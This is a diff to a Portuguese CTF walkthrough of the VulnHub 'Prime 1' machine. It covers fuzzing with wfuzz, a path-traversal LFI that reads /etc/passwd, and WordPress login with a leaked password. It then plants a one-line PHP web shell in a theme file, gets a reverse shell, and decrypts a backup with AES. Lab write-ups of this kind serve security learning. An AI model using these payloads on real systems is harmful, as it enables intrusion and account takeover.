@@ -42,7 +42,7 @@ Primeira coisa a se fazer sempre é verificar o que está sendo executado na por
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/web.png)
 
-Pelo estilo de site, tem muito cara de ser Drupal, pelas cores e tudo mais, mas não é! É um php simples mesmo.
+Pareceu um site normal mesmo... vamos prosseguir na enumeração
 
 ### Gobuster
 
@@ -82,6 +82,16 @@ Então vamos utilizar ela pra descobrir parâmetros dentro do site
 
 ### Wfuzz
 
+Primeiro vamos descobrir qual é o parâmetro
+
+```bash
+wfuzz -t 200 -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hw 12 http://192.168.56.104/index.php?FUZZ=algo
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wfuzz2.png)
+
+Agora por arquivos que possam ser de interesse com o parâmetro **file** que encontramos
+
 ```bash
 wfuzz -t 200 -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hw 19 http://192.168.56.104/index.php?file=FUZZ.txt
 ```
@@ -109,4 +119,152 @@ wfuzz -t 200 -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wfuzz1.png)
 
-Não encontramos nada de útil...
+Não encontramos nada de útil... Então vamos recorrer ao outro php que ele encontrou no início do gobuster, o `image.php`
+
+### LFI
+
+Testamos diversos LFI nele, e o que encontramos foi o ../../../../../etc/passwd, onde diz que devemos olhar pelo arquivo password.txt no home do saket
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/lfi.png)
+
+Nada de interessante
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/lfi1.png)
+
+follow_the_ippsec? Estranho, isso pode ser um senha de alguma coisa... vamos tentar entrar no wordpress que tem nele, que encontramos lá no começo do gobuster
+
+## WordPress
+
+Vimos que não deu certo com o usuário saket
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp1.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp2.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp3.png)
+
+Então testamos com o `victor` que também tinha no /etc/passwd
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp4.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp5.png)
+
+E estamos dentro!
+
+Depois de fuçar um pouco nele encontramos um arquivo que podemos escrever, o `secret.php`
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp6.png)
+
+## Reverse shell
+
+Então adicionamos um reverse shell ali pra receber na nossa máquina
+
+**<?php system($_GET['cmd']);?>**
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp7.png)
+
+Salvamos e testamos agora
+
+```
+http://192.168.56.104/wordpress/wp-content/themes/twentynineteen/secret.php?cmd=id
+```
+
+Temos RCE!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/wp8.png)
+
+# Usuário Comum
+
+Agora pegamos um shell reverso
+
+Setamos nosso nc
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/rev.png)
+
+Jogamos pro BurpSuite, só pra ficar melhor de trabalhar
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/rev1.png)
+
+Repeater
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/rev2.png)
+
+Agora pegamos o reverse
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/rev3.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/rev4.png)
+
+Vamos iniciar a escalação de privilégio
+
+# www-data para Saket
+
+Para enumerar vamos executar o `linpeas` pra ver se encontramos algum ponto de escalação de priviégio
+
+**https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh**
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas.png)
+
+Passamos pra máquina
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas1.png)
+
+Executamos
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas2.png)
+
+Agora vamos verificar o que podemos fazer para escalar privilégio nesse máquina
+
+Encontramos que o www-data pode dar um comando de sudo... interessante
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas3.png)
+
+Confirmamos isso
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas4.png)
+
+Ao executarmos, ele pede um senha
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas5.png)
+
+"backup_password"
+
+Não sabemos a senha, mas rodando pelas pastas da máquina encontramos algo interessante em **/opt/backup/backup_pass**
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas6.png)
+
+É a senha do enc... então executamos ele denovo com essa senha
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas7.png)
+
+Ele nos deu outro arquivo, o **key.txt** e o **enc.txt**
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/linpeas8.png)
+
+Uma vez que temos a chave e o arquivo encriptado, podemos decritografar ele
+
+Aqui está o código, a fonte foi o Blog do [mzfr](https://blog.mzfr.me/vulnhub-writeups/2019-09-04-prime)
+
+```python
+from Crypto.Cipher import AES
+from base64 import b64decode
+
+data = b64decode(b"nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=")
+key = b"366a74cb3c959de17d61db30591c39d1"
+cip = AES.new(key,AES.MODE_ECB)
+print(cip.decrypt(data).decode("utf-8"))
+```
+
+E conseguimos outra senha, possivelmente do usuário Victor ou do saket
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/dec.png)
+
+Conseguimos logar com o saket
+
+# Saket para root
+
+Damos um **su saket** e entramos como saket agora
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-prime1/sak.png)
